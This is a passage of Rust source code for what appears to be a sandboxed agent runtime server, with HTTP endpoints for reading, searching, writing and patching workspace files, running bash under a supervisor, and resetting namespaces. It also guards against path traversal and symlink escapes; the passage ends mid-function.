use axum::{
    Json, Router,
    body::Body,
    extract::State,
    http::{HeaderMap, Request, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
};
use cap_fs_ext::{DirExt, FollowSymlinks, OpenOptionsFollowExt};
use cap_std::{
    ambient_authority,
    fs::{Dir, OpenOptions},
};
use diffy::Patch;
use regex::Regex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::{
    io::{self, Read as _, Write as _},
    path::{Component, Path, PathBuf},
    sync::Arc,
    time::{Duration, Instant, SystemTime, UNIX_EPOCH},
};
#[cfg(test)]
use tokio::io::{AsyncRead, AsyncReadExt};
#[cfg(test)]
use tokio::time::timeout;
use tokio::{fs, io::AsyncWriteExt};
use tracing::{info, warn};
use walkdir::WalkDir;

pub mod audit;
#[cfg(all(feature = "c7-test-support", target_os = "linux"))]
pub mod c7_test_support;
pub mod cgroup;
pub mod config;
pub mod exec;
pub mod fetch_auth;
pub mod fetch_broker;
pub mod fetch_cli;
pub mod fetch_policy;
pub mod fetch_protocol;
pub mod runtime_fetch_proxy;
pub mod runtime_security;
pub mod sandbox;
pub mod workspace_budget;

use cgroup::CommandIdentity;
use exec::{BashHealth, CommandSupervisor, ExecTarget, SupervisorError};
use runtime_fetch_proxy::RuntimeFetchProxy;
use workspace_budget::{Reservation, WorkspaceBudget};

#[derive(Clone)]
pub struct AppState {
    pub workspace_root: PathBuf,
    pub skills_root: PathBuf,
    pub auth_token: Option<String>,
    pub max_output_chars: usize,
    pub command_timeout: Duration,
    pub trace_jsonl_path: PathBuf,
    pub bash_sandbox: BashSandboxMode,
    pub command_supervisor: Option<CommandSupervisor>,
    pub bash_health: BashHealth,
    pub fetch_proxy: RuntimeFetchProxy,
    pub require_fetch_for_readiness: bool,
    pub bash_readiness_error: String,
    pub workspace_budget: WorkspaceBudget,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum BashSandboxMode {
    #[cfg(test)]
    None,
    Proot,
}

#[derive(Debug, Deserialize)]
pub struct CommonRequest {
    pub namespace: String,
    pub run_id: String,
    #[serde(default = "default_cwd")]
    pub cwd: String,
}

#[derive(Debug, Deserialize)]
pub struct ReadRequest {
    #[serde(flatten)]
    pub common: CommonRequest,
    pub path: String,
}

#[derive(Debug, Deserialize)]
pub struct GrepRequest {
    #[serde(flatten)]
    pub common: CommonRequest,
    pub pattern: String,
    #[serde(default)]
    pub path: String,
}

#[derive(Debug, Deserialize)]
pub struct WriteRequest {
    #[serde(flatten)]
    pub common: CommonRequest,
    pub path: String,
    pub content: String,
}

#[derive(Debug, Deserialize)]
pub struct EditRequest {
    #[serde(flatten)]
    pub common: CommonRequest,
    pub path: String,
    pub patch: String,
}

#[derive(Debug, Deserialize)]
pub struct BashRequest {
    #[serde(flatten)]
    pub common: CommonRequest,
    pub command: String,
    #[serde(default)]
    pub timeout: String,
}

#[derive(Debug, Deserialize)]
pub struct ResetRequest {
    #[serde(flatten)]
    pub common: CommonRequest,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct TextResponse {
    #[serde(skip_serializing_if = "String::is_empty", default)]
    pub content: String,
    #[serde(skip_serializing_if = "String::is_empty", default)]
    pub output: String,
    #[serde(default)]
    pub ok: bool,
    #[serde(default)]
    pub bytes: usize,
    #[serde(default)]
    pub truncated: bool,
    #[serde(skip_serializing_if = "String::is_empty", default)]
    pub error: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct BashResponse {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub duration_ms: u128,
    pub truncated: bool,
    #[serde(skip_serializing_if = "String::is_empty", default)]
    pub error: String,
}

#[derive(Debug, Serialize)]
pub struct StatusResponse {
    pub ok: bool,
    pub version: String,
    pub workspace_root: String,
    pub skills_root: String,
    pub bash_sandbox: String,
    pub bash_ready: bool,
    pub fetch_enabled: bool,
    pub fetch_ready: bool,
    pub supervisor_dumpable: bool,
    pub policy_version: String,
    pub readiness_error: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ResetResponse {
    pub ok: bool,
    pub namespace_hash: String,
    pub removed: bool,
}

#[derive(Debug, Serialize)]
struct TraceRecord {
    run_id_hash: String,
    namespace_hash: String,
    op: String,
    duration_ms: u128,
    ok: bool,
    error: String,
    exit_code: Option<i32>,
    truncated: bool,
    timestamp_ms: u128,
}

#[derive(Debug)]
pub struct RuntimeError {
    status: StatusCode,
    message: String,
}

impl RuntimeError {
    fn bad_request(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::BAD_REQUEST,
            message: message.into(),
        }
    }

    fn forbidden(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::FORBIDDEN,
            message: message.into(),
        }
    }

    fn internal(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::INTERNAL_SERVER_ERROR,
            message: message.into(),
        }
    }

    fn unavailable(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::SERVICE_UNAVAILABLE,
            message: message.into(),
        }
    }
}

impl IntoResponse for RuntimeError {
    fn into_response(self) -> Response {
        let body = Json(serde_json::json!({ "error": self.message }));
        (self.status, body).into_response()
    }
}

pub fn app(state: AppState) -> Router {
    let state = Arc::new(state);
    Router::new()
        .route("/v1/read", post(read_handler))
        .route("/v1/grep", post(grep_handler))
        .route("/v1/write", post(write_handler))
        .route("/v1/edit", post(edit_handler))
        .route("/v1/bash", post(bash_handler))
        .route("/v1/reset", post(reset_handler))
        .route("/v1/status", get(status_handler))
        .with_state(state)
}

async fn read_handler(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<ReadRequest>,
) -> Result<Json<TextResponse>, RuntimeError> {
    authorize(&state, &headers)?;
    let start = Instant::now();
    let result = read_file(&state, &req).await;
    write_trace(
        &state,
        &req.common,
        "read",
        start,
        result.as_ref().err(),
        None,
        false,
    )
    .await;
    result.map(Json)
}

async fn grep_handler(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<GrepRequest>,
) -> Result<Json<TextResponse>, RuntimeError> {
    authorize(&state, &headers)?;
    let start = Instant::now();
    let result = grep_files(&state, &req).await;
    let truncated = result.as_ref().map(|r| r.truncated).unwrap_or(false);
    write_trace(
        &state,
        &req.common,
        "grep",
        start,
        result.as_ref().err(),
        None,
        truncated,
    )
    .await;
    result.map(Json)
}

async fn write_handler(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<WriteRequest>,
) -> Result<Json<TextResponse>, RuntimeError> {
    authorize(&state, &headers)?;
    let start = Instant::now();
    let result = write_file(&state, &req).await;
    write_trace(
        &state,
        &req.common,
        "write",
        start,
        result.as_ref().err(),
        None,
        false,
    )
    .await;
    result.map(Json)
}

async fn edit_handler(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<EditRequest>,
) -> Result<Json<TextResponse>, RuntimeError> {
    authorize(&state, &headers)?;
    let start = Instant::now();
    let result = edit_file(&state, &req).await;
    write_trace(
        &state,
        &req.common,
        "edit",
        start,
        result.as_ref().err(),
        None,
        false,
    )
    .await;
    result.map(Json)
}

async fn bash_handler(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<BashRequest>,
) -> Result<Json<BashResponse>, RuntimeError> {
    authorize(&state, &headers)?;
    let start = Instant::now();
    let result = run_bash(&state, &req).await;
    let exit_code = result.as_ref().ok().map(|r| r.exit_code);
    let truncated = result.as_ref().map(|r| r.truncated).unwrap_or(false);
    write_trace(
        &state,
        &req.common,
        "bash",
        start,
        result.as_ref().err(),
        exit_code,
        truncated,
    )
    .await;
    result.map(Json)
}

async fn status_handler(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> Result<Json<StatusResponse>, RuntimeError> {
    authorize(&state, &headers)?;
    let bash_ready = state.command_supervisor.is_some() && state.bash_health.is_ready();
    let fetch_enabled = state.fetch_proxy.is_enabled();
    let fetch_ready = state.fetch_proxy.probe().await;
    let supervisor_dumpable = crate::sandbox::runtime_supervisor_dumpable().unwrap_or(true);
    let mut readiness_errors = Vec::new();
    if !bash_ready {
        readiness_errors.push(if !state.bash_health.is_ready() {
            state.bash_health.reason()
        } else if state.bash_readiness_error.is_empty() {
            "bash unavailable".to_string()
        } else {
            state.bash_readiness_error.clone()
        });
    }
    if fetch_enabled && state.require_fetch_for_readiness && !fetch_ready {
        readiness_errors.push("fetch broker unavailable".to_string());
    }
    if supervisor_dumpable {
        readiness_errors.push("runtime supervisor is dumpable".to_string());
    }
    Ok(Json(StatusResponse {
        ok: bash_ready
            && !supervisor_dumpable
            && (!fetch_enabled || !state.require_fetch_for_readiness || fetch_ready),
        version: env!("CARGO_PKG_VERSION").to_string(),
        workspace_root: state.workspace_root.display().to_string(),
        skills_root: state.skills_root.display().to_string(),
        bash_sandbox: state.bash_sandbox.as_str().to_string(),
        bash_ready,
        fetch_enabled,
        fetch_ready,
        supervisor_dumpable,
        policy_version: state.fetch_proxy.policy_version().to_string(),
        readiness_error: readiness_errors.join("; "),
    }))
}

async fn reset_handler(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<ResetRequest>,
) -> Result<Json<ResetResponse>, RuntimeError> {
    authorize(&state, &headers)?;
    let start = Instant::now();
    let result = reset_namespace(&state, &req).await;
    write_trace(
        &state,
        &req.common,
        "reset",
        start,
        result.as_ref().err(),
        None,
        false,
    )
    .await;
    result.map(Json)
}

async fn read_file(state: &AppState, req: &ReadRequest) -> Result<TextResponse, RuntimeError> {
    let data = if let Some(components) = workspace_access_components(state, &req.common, &req.path)?
    {
        if components.is_empty() {
            return Err(RuntimeError::bad_request(
                "read failed: path is a directory",
            ));
        }
        read_workspace_file_nofollow(state, &req.common.namespace, components, "read failed")
            .await?
    } else {
        let path = resolve_virtual_path(state, &req.common, &req.path, AccessMode::Read).await?;
        fs::read_to_string(&path)
            .await
            .map_err(|e| RuntimeError::bad_request(format!("read failed: {e}")))?
    };
    let (content, truncated) = truncate_output(data, state.max_output_chars);
    Ok(TextResponse {
        content,
        ok: true,
        truncated,
        ..Default::default()
    })
}

async fn grep_files(state: &AppState, req: &GrepRequest) -> Result<TextResponse, RuntimeError> {
    if req.pattern.trim().is_empty() {
        return Err(RuntimeError::bad_request("pattern is empty"));
    }
    let target = if req.path.trim().is_empty() {
        req.common.cwd.as_str()
    } else {
        req.path.as_str()
    };
    let re = Regex::new(&req.pattern)
        .or_else(|_| Regex::new(&regex::escape(&req.pattern)))
        .map_err(|e| RuntimeError::bad_request(format!("invalid pattern: {e}")))?;
    let output = if let Some(components) = workspace_access_components(state, &req.common, target)?
    {
        grep_workspace_nofollow(state, &req.common.namespace, components, re).await?
    } else {
        let path = resolve_virtual_path(state, &req.common, target, AccessMode::Read).await?;
        let mut output = String::new();
        if path.is_file() {
            grep_one_file(state, &req.common.namespace, &path, &re, &mut output).await?;
        } else {
            for entry in WalkDir::new(&path).into_iter().filter_map(Result::ok) {
                if !entry.file_type().is_file() {
                    continue;
                }
                grep_one_file(state, &req.common.namespace, entry.path(), &re, &mut output).await?;
                if output.len() > state.max_output_chars {
                    break;
                }
            }
        }
        output
    };
    let (output, truncated) = truncate_output(output, state.max_output_chars);
    Ok(TextResponse {
        output,
        ok: true,
        truncated,
        ..Default::default()
    })
}

async fn grep_one_file(
    state: &AppState,
    namespace: &str,
    path: &Path,
    re: &Regex,
    output: &mut String,
) -> Result<(), RuntimeError> {
    let Ok(data) = fs::read_to_string(path).await else {
        return Ok(());
    };
    let display_path = virtual_output_path(state, namespace, path);
    append_grep_matches(&display_path, &data, re, output);
    Ok(())
}

fn append_grep_matches(display_path: &str, data: &str, re: &Regex, output: &mut String) {
    for (idx, line) in data.lines().enumerate() {
        if re.is_match(line) {
            output.push_str(&format!("{display_path}:{}:{line}\n", idx + 1));
        }
    }
}

fn virtual_output_path(state: &AppState, namespace: &str, path: &Path) -> String {
    let workspace = namespace_workspace(state, namespace);
    if let Ok(rel) = path.strip_prefix(&workspace) {
        return join_virtual_path("/workspace", rel);
    }
    if let Ok(rel) = path.strip_prefix(&state.skills_root) {
        return join_virtual_path("/skills", rel);
    }
    path.display().to_string()
}

fn join_virtual_path(prefix: &str, rel: &Path) -> String {
    let rel = rel.to_string_lossy().replace('\\', "/");
    if rel.is_empty() {
        prefix.to_string()
    } else {
        format!("{prefix}/{rel}")
    }
}

async fn write_file(state: &AppState, req: &WriteRequest) -> Result<TextResponse, RuntimeError> {
    let components = workspace_write_components(state, &req.common, &req.path)?;
    let target = workspace_host_path(state, &req.common.namespace, &components);
    let reservation = reserve_workspace_replace(state, target, req.content.len()).await?;
    write_workspace_file_nofollow(
        state,
        &req.common.namespace,
        components,
        req.content.as_bytes().to_vec(),
        "write failed",
        true,
    )
    .await?;
    reservation.commit();
    Ok(TextResponse {
        ok: true,
        bytes: req.content.len(),
        ..Default::default()
    })
}

async fn edit_file(state: &AppState, req: &EditRequest) -> Result<TextResponse, RuntimeError> {
    let components = workspace_write_components(state, &req.common, &req.path)?;
    let original = read_workspace_file_nofollow(
        state,
        &req.common.namespace,
        components.clone(),
        "read before edit failed",
    )
    .await?;
    let patch = Patch::from_str(&req.patch)
        .map_err(|e| RuntimeError::bad_request(format!("invalid unified diff: {e}")))?;
    let edited = diffy::apply(&original, &patch)
        .map_err(|e| RuntimeError::bad_request(format!("apply patch failed: {e}")))?;
    let target = workspace_host_path(state, &req.common.namespace, &components);
    let reservation = reserve_workspace_replace(state, target, edited.len()).await?;
    write_workspace_file_nofollow(
        state,
        &req.common.namespace,
        components,
        edited.as_bytes().to_vec(),
        "write edited file failed",
        false,
    )
    .await?;
    reservation.commit();
    Ok(TextResponse {
        ok: true,
        bytes: edited.len(),
        ..Default::default()
    })
}

fn workspace_write_components(
    state: &AppState,
    common: &CommonRequest,
    raw: &str,
) -> Result<Vec<std::ffi::OsString>, RuntimeError> {
    let Some(components) = workspace_access_components(state, common, raw)? else {
        return Err(RuntimeError::forbidden("skills are read-only"));
    };
    if components.is_empty() {
        return Err(RuntimeError::bad_request("write target must name a file"));
    }
    Ok(components)
}

fn workspace_access_components(
    state: &AppState,
    common: &CommonRequest,
    raw: &str,
) -> Result<Option<Vec<std::ffi::OsString>>, RuntimeError> {
    let workspace = namespace_workspace(state, &common.namespace);
    let raw = if raw.trim().is_empty() {
        "/workspace"
    } else {
        raw.trim()
    };
    let (base, rel) = split_virtual_path(state, &workspace, &common.cwd, raw)?;
    if base.as_path() == state.skills_root.as_path() {
        return Ok(None);
    }
    if base != workspace {
        return Err(RuntimeError::forbidden(
            "path must be under /workspace or /skills",
        ));
    }
    safe_join(&workspace, &rel)?;
    Ok(Some(workspace_path_components(&rel)?))
}

fn workspace_path_components(relative: &Path) -> Result<Vec<std::ffi::OsString>, RuntimeError> {
    let mut components = Vec::new();
    for component in relative.components() {
        match component {
            Component::Normal(name) => components.push(name.to_os_string()),
            Component::CurDir => {}
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(RuntimeError::forbidden("path traversal is not allowed"));
            }
        }
    }
    Ok(components)
}

fn workspace_host_path(
    state: &AppState,
    namespace: &str,
    components: &[std::ffi::OsString],
) -> PathBuf {
    let mut path = state.workspace_root.join(sanitize_namespace(namespace));
    for component in components {
        path.push(component);
    }
    path
}

async fn reserve_workspace_replace(
    state: &AppState,
    path: PathBuf,
    new_len: usize,
) -> Result<Reservation, RuntimeError> {
    let budget = state.workspace_budget.clone();
    let new_len = u64::try_from(new_len)
        .map_err(|_| RuntimeError::bad_request("workspace capacity limit exceeded"))?;
    tokio::task::spawn_blocking(move || {
        let mut reservation = budget.begin_replace(path)?;
        reservation.reserve_total(new_len)?;
        Ok::<_, crate::workspace_budget::WorkspaceBudgetError>(reservation)
    })
    .await
    .map_err(|_| RuntimeError::internal("workspace capacity check failed"))?
    .map_err(|error| {
        if error.is_invalid_path() {
            RuntimeError::forbidden(error.to_string())
        } else {
            RuntimeError::bad_request(error.to_string())
        }
    })
}

async fn read_workspace_file_nofollow(
    state: &AppState,
    namespace: &str,
    components: Vec<std::ffi::OsString>,
    error_prefix: &'static str,
) -> Result<String, RuntimeError> {
    let workspace_root = state.workspace_root.clone();
    let namespace = sanitize_namespace(namespace);
    tokio::task::spawn_blocking(move || {
        let (parent, file_name) =
            open_workspace_file_parent_nofollow(&workspace_root, &namespace, &components, false)?;
        read_file_from_dir_nofollow(&parent, &file_name)
            .map_err(|error| RuntimeError::bad_request(format!("{error_prefix}: {error}")))
    })
    .await
    .map_err(|error| RuntimeError::internal(format!("workspace read task failed: {error}")))?
}

async fn write_workspace_file_nofollow(
    state: &AppState,
    namespace: &str,
    components: Vec<std::ffi::OsString>,
    content: Vec<u8>,
    error_prefix: &'static str,
    create_parents: bool,
) -> Result<usize, RuntimeError> {
    let workspace_root = state.workspace_root.clone();
    let namespace = sanitize_namespace(namespace);
    tokio::task::spawn_blocking(move || {
        let mut host_parent = workspace_root.join(&namespace);
        for component in &components[..components.len().saturating_sub(1)] {
            host_parent.push(component);
        }
        let (parent, file_name) = open_workspace_file_parent_nofollow(
            &workspace_root,
            &namespace,
            &components,
            create_parents,
        )?;
        match parent.symlink_metadata(Path::new(&file_name)) {
            Ok(metadata) if metadata.file_type().is_symlink() || !metadata.is_file() => {
                return Err(RuntimeError::forbidden(format!(
                    "{error_prefix}: destination is not a safe regular file"
                )));
            }
            Ok(_) => {}
            Err(error) if error.kind() == io::ErrorKind::NotFound => {}
            Err(error) => {
                return Err(RuntimeError::forbidden(format!(
                    "{error_prefix}: inspect destination failed: {error}"
                )));
            }
        }
        let temporary = adjacent_temporary_name(&file_name)?;
        let mut options = OpenOptions::new();
        options
            .write(true)
            .create_new(true)
            .follow(FollowSymlinks::No);
        let result = (|| {
            let mut file = parent
                .open_with(Path::new(&temporary), &options)
                .map_err(|error| {
                    RuntimeError::forbidden(format!(
                        "{error_prefix}: safe temp open failed: {error}"
                    ))
                })?;
            file.write_all(&content)
                .map_err(|error| RuntimeError::internal(format!("{error_prefix}: {error}")))?;
            file.sync_all().map_err(|error| {
                RuntimeError::internal(format!("{error_prefix}: sync temp failed: {error}"))
            })?;
            parent
                .rename(Path::new(&temporary), &parent, Path::new(&file_name))
                .map_err(|error| {
                    RuntimeError::internal(format!("{error_prefix}: atomic rename failed: {error}"))
                })?;
            #[cfg(unix)]
            std::fs::File::open(&host_parent)
                .and_then(|directory| directory.sync_all())
                .map_err(|error| {
                    RuntimeError::internal(format!(
                        "{error_prefix}: sync directory failed: {error}"
                    ))
                })?;
            Ok(())
        })();
        if result.is_err() {
            let _ = parent.remove_file(Path::new(&temporary));
        }
        result?;
        Ok(content.len())
    })
    .await
    .map_err(|error| RuntimeError::internal(format!("workspace write task failed: {error}")))?
}

fn adjacent_temporary_name(
    destination: &std::ffi::OsString,
) -> Result<std::ffi::OsString, RuntimeError> {
    let mut nonce = [0_u8; 8];
    getrandom::fill(&mut nonce)
        .map_err(|_| RuntimeError::internal("create workspace temporary name failed"))?;
    let suffix = nonce
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect::<String>();
    Ok(std::ffi::OsString::from(format!(
        ".{}.agent-runtime-{suffix}.tmp",
        destination.to_string_lossy()
    )))
}

fn open_workspace_file_parent_nofollow(
    workspace_root: &Path,
    namespace: &str,
    components: &[std::ffi::OsString],
    create_parents: bool,
) -> Result<(Dir, std::ffi::OsString), RuntimeError> {
    let mut directory =
        open_workspace_namespace_nofollow(workspace_root, namespace, create_parents)?;
    let (file_name, parent_components) = components
        .split_last()
        .ok_or_else(|| RuntimeError::bad_request("write target must name a file"))?;
    for component in parent_components {
        directory = open_or_create_dir_nofollow(&directory, Path::new(component), create_parents)
            .map_err(|error| {
            RuntimeError::forbidden(format!("resolved path escapes namespace: {error}"))
        })?;
    }
    Ok((directory, file_name.clone()))
}

fn open_workspace_namespace_nofollow(
    workspace_root: &Path,
    namespace: &str,
    create_namespace: bool,
) -> Result<Dir, RuntimeError> {
    let root = Dir::open_ambient_dir(workspace_root, ambient_authority())
        .map_err(|error| RuntimeError::internal(format!("open workspace root failed: {error}")))?;
    open_or_create_dir_nofollow(&root, Path::new(namespace), create_namespace).map_err(|error| {
        RuntimeError::forbidden(format!("resolved path escapes namespace: {error}"))
    })
}

fn open_or_create_dir_nofollow(
    parent: &Dir,
    name: &Path,
    create_if_missing: bool,
) -> io::Result<Dir> {
    match parent.open_dir_nofollow(name) {
        Ok(directory) => Ok(directory),
        Err(error) if create_if_missing && error.kind() == io::ErrorKind::NotFound => {
            if let Err(error) = parent.create_dir(name)
                && error.kind() != io::ErrorKind::AlreadyExists
            {
                return Err(error);
            }
            parent.open_dir_nofollow(name)
        }
        Err(error) => Err(error),
    }
}

async fn grep_workspace_nofollow(
    state: &AppState,
    namespace: &str,
    components: Vec<std::ffi::OsString>,
    re: Regex,
) -> Result<String, RuntimeError> {
    let workspace_root = state.workspace_root.clone();
    let namespace = sanitize_namespace(namespace);
    let max_output_chars = state.max_output_chars;
    tokio::task::spawn_blocking(move || {
        grep_workspace_nofollow_sync(
            &workspace_root,
            &namespace,
            &components,
            &re,
            max_output_chars,
        )
    })
    .await
    .map_err(|error| RuntimeError::internal(format!("workspace grep task failed: {error}")))?
}

fn grep_workspace_nofollow_sync(
    workspace_root: &Path,
    namespace: &str,
    components: &[std::ffi::OsString],
    re: &Regex,
    max_output_chars: usize,
) -> Result<String, RuntimeError> {
    let mut output = String::new();
    let relative = workspace_relative_path(components);
    if components.is_empty() {
        let directory = open_workspace_namespace_nofollow(workspace_root, namespace, false)?;
        grep_workspace_directory_nofollow(
            &directory,
            &relative,
            re,
            &mut output,
            max_output_chars,
        )?;
        return Ok(output);
    }

    let (parent, file_name) =
        open_workspace_file_parent_nofollow(workspace_root, namespace, components, false)?;
    let metadata = parent
        .symlink_metadata(Path::new(&file_name))
        .map_err(|error| {
            RuntimeError::forbidden(format!("grep target cannot be opened safely: {error}"))
        })?;
    let file_type = metadata.file_type();
    if file_type.is_symlink() {
        return Err(RuntimeError::forbidden("grep target is a symbolic link"));
    }
    if file_type.is_dir() {
        let directory = parent
            .open_dir_nofollow(Path::new(&file_name))
            .map_err(|error| {
                RuntimeError::forbidden(format!("grep target cannot be opened safely: {error}"))
            })?;
        grep_workspace_directory_nofollow(
            &directory,
            &relative,
            re,
            &mut output,
            max_output_chars,
        )?;
    } else if file_type.is_file() {
        let data = read_file_from_dir_nofollow(&parent, &file_name).map_err(|error| {
            RuntimeError::forbidden(format!("grep target cannot be opened safely: {error}"))
        })?;
        append_grep_matches(
            &join_virtual_path("/workspace", &relative),
            &data,
            re,
            &mut output,
        );
    }
    Ok(output)
}

fn grep_workspace_directory_nofollow(
    directory: &Dir,
    relative: &Path,
    re: &Regex,
    output: &mut String,
    max_output_chars: usize,
) -> Result<(), RuntimeError> {
    let entries = directory
        .entries()
        .map_err(|error| RuntimeError::internal(format!("grep directory failed: {error}")))?;
    for entry in entries.filter_map(Result::ok) {
        let file_type = match entry.file_type() {
            Ok(file_type) => file_type,
            Err(_) => continue,
        };
        if file_type.is_symlink() {
            continue;
        }
        let name = entry.file_name();
        let child_relative = relative.join(&name);
        if file_type.is_dir() {
            let Ok(child) = directory.open_dir_nofollow(Path::new(&name)) else {
                continue;
            };
            grep_workspace_directory_nofollow(
                &child,
                &child_relative,
                re,
                output,
                max_output_chars,
            )?;
        } else if file_type.is_file() {
            let Ok(data) = read_file_from_dir_nofollow(directory, &name) else {
                continue;
            };
            append_grep_matches(
                &join_virtual_path("/workspace", &child_relative),
                &data,
                re,
                output,
            );
        }
        if output.len() > max_output_chars {
            break;
        }
    }
    Ok(())
}

fn read_file_from_dir_nofollow(parent: &Dir, file_name: &std::ffi::OsString) -> io::Result<String> {
    let mut options = OpenOptions::new();
    options.read(true).follow(FollowSymlinks::No);
    let mut file = parent.open_with(Path::new(file_name), &options)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    Ok(contents)
}

fn workspace_relative_path(components: &[std::ffi::OsString]) -> PathBuf {
    let mut path = PathBuf::new();
    for component in components {
        path.push(component);
    }
    path
}

async fn run_bash(state: &AppState, req: &BashRequest) -> Result<BashResponse, RuntimeError> {
    if req.command.trim().is_empty() {
        return Err(RuntimeError::bad_request("command is empty"));
    }
    let supervisor = state.command_supervisor.as_ref().ok_or_else(|| {
        RuntimeError::unavailable("bash unavailable: cgroup v2 delegation is not ready")
    })?;
    if !state.bash_health.is_ready() {
        return Err(RuntimeError::unavailable(state.bash_health.reason()));
    }
    let cwd = resolve_virtual_path(state, &req.common, &req.common.cwd, AccessMode::Read).await?;
    let virtual_cwd = normalize_virtual_cwd(&req.common.cwd)?;
    if virtual_cwd == "/workspace" || virtual_cwd.starts_with("/workspace/") {
        fs::create_dir_all(&cwd)
            .await
            .map_err(|e| RuntimeError::internal(format!("create cwd failed: {e}")))?;
    } else if !cwd.exists() {
        return Err(RuntimeError::bad_request("cwd does not exist"));
    }
    let timeout_duration = parse_timeout(&req.timeout)
        .unwrap_or(state.command_timeout)
        .min(state.command_timeout);
    let started = Instant::now();
    let command_id = state
        .fetch_proxy
        .new_command_id()
        .map_err(|error| RuntimeError::internal(error.to_string()))?;
    let identity = CommandIdentity::new(&req.common.namespace, &req.common.run_id, &command_id);
    let (target, cleanup_dir) =
        shell_exec_target(state, &req.common, &req.command, &cwd, &virtual_cwd).await?;
    let fetch_proxy = state.fetch_proxy.clone();
    let fetch_health = supervisor.health();
    let namespace = req.common.namespace.clone();
    let run_id = req.common.run_id.clone();
    let failed_start_cleanup = cleanup_dir.clone();
    let handle = match supervisor.start_command_with_launch(
        identity,
        target,
        move || {
            let binding = fetch_proxy
                .bind_command(
                    &namespace,
                    &run_id,
                    command_id.clone(),
                    timeout_duration,
                    fetch_health,
                )
                .map_err(|error| error.to_string())?;
            binding
                .into_launch(fetch_proxy.shell_environment())
                .map_err(|error| error.to_string())
        },
        timeout_duration,
        state.max_output_chars,
        cleanup_dir,
    ) {
        Ok(handle) => handle,
        Err(error) => {
            if !error.preserves_cleanup_state()
                && let Some(directory) = failed_start_cleanup
            {
                let _ = fs::remove_dir_all(directory).await;
            }
            return Err(supervisor_runtime_error(error));
        }
    };
    let output = handle.wait().await.map_err(supervisor_runtime_error)?;
    let duration_ms = started.elapsed().as_millis();
    Ok(BashResponse {
        exit_code: output.exit_code,
        truncated: output.truncated,
        stdout: output.stdout,
        stderr: output.stderr,
        duration_ms,
        error: String::new(),
    })
}

fn supervisor_runtime_error(error: SupervisorError) -> RuntimeError {
    if error.is_timeout() {
        RuntimeError::bad_request("command timed out")
    } else if error.is_canceled() {
        RuntimeError::bad_request("command canceled")
    } else if error.is_unavailable() {
        RuntimeError::unavailable(error.to_string())
    } else {
        RuntimeError::internal(format!("command failed: {error}"))
    }
}

#[cfg(test)]
const OUTPUT_READ_BUFFER_SIZE: usize = 8 * 1024;
const TRUNCATION_MARKER: &str = "\n[truncated]";

#[cfg(test)]
struct CollectedOutput {
    bytes: Vec<u8>,
    truncated: bool,
}

#[cfg(test)]
async fn collect_output<R>(mut reader: R, limit: usize) -> std::io::Result<CollectedOutput>
where
    R: AsyncRead + Unpin,
{
    let mut bytes = Vec::with_capacity(limit.min(OUTPUT_READ_BUFFER_SIZE));
    let mut buffer = [0; OUTPUT_READ_BUFFER_SIZE];
    let mut truncated = false;
    loop {
        let read = reader.read(&mut buffer).await?;
        if read == 0 {
            break;
        }
        if limit == 0 {
            bytes.extend_from_slice(&buffer[..read]);
            continue;
        }
        let retained = read.min(limit.saturating_sub(bytes.len()));
        bytes.extend_from_slice(&buffer[..retained]);
        truncated |= retained < read;
    }
    Ok(CollectedOutput { bytes, truncated })
}

#[cfg(test)]
fn format_collected_output(output: CollectedOutput) -> String {
    let mut text = String::from_utf8_lossy(&output.bytes).into_owned();
    if !output.truncated {
        return text;
    }
    let limit = output.bytes.len();
    if text.len() > limit {
        return truncate_output(text, limit).0;
    }
    text.push_str(TRUNCATION_MARKER);
    text
}

async fn reset_namespace(
    state: &AppState,
    req: &ResetRequest,
) -> Result<ResetResponse, RuntimeError> {
    if req.common.namespace.trim().is_empty() {
        return Err(RuntimeError::bad_request("namespace is empty"));
    }
    let workspace = namespace_workspace(state, &req.common.namespace);
    ensure_reset_target(state, &workspace).await?;
    let removed = if fs::metadata(&workspace).await.is_ok() {
        fs::remove_dir_all(&workspace)
            .await
            .map_err(|e| RuntimeError::internal(format!("reset workspace failed: {e}")))?;
        true
    } else {
        false
    };
    let jail_root = state
        .workspace_root
        .join(".runtime-jails")
        .join(sanitize_namespace(&req.common.namespace));
    if ensure_optional_reset_target(state, &jail_root).await?
        && fs::metadata(&jail_root).await.is_ok()
    {
        fs::remove_dir_all(&jail_root)
            .await
            .map_err(|e| RuntimeError::internal(format!("reset sandbox failed: {e}")))?;
    }
    Ok(ResetResponse {
        ok: true,
        namespace_hash: hash(&req.common.namespace),
        removed,
    })
}

async fn ensure_reset_target(state: &AppState, path: &Path) -> Result<(), RuntimeError> {
    let canonical_root = fs::canonicalize(&state.workspace_root)
        .await
        .map_err(|e| RuntimeError::internal(format!("canonicalize workspace root failed: {e}")))?;
    let existing = match fs::canonicalize(path).await {
        Ok(path) => path,
        Err(_) if path.starts_with(&state.workspace_root) => return Ok(()),
        Err(e) => {
            return Err(RuntimeError::internal(format!(
                "canonicalize reset target failed: {e}"
            )));
        }
    };
    if existing == canonical_root {
        return Err(RuntimeError::forbidden("refusing to reset workspace root"));
    }
    if existing.starts_with(canonical_root) {
        Ok(())
    } else {
        Err(RuntimeError::forbidden(
            "reset target escapes workspace root",
        ))
    }
}

async fn ensure_optional_reset_target(state: &AppState, path: &Path) -> Result<bool, RuntimeError> {
    if fs::metadata(path).await.is_err() {
        return Ok(false);
    }
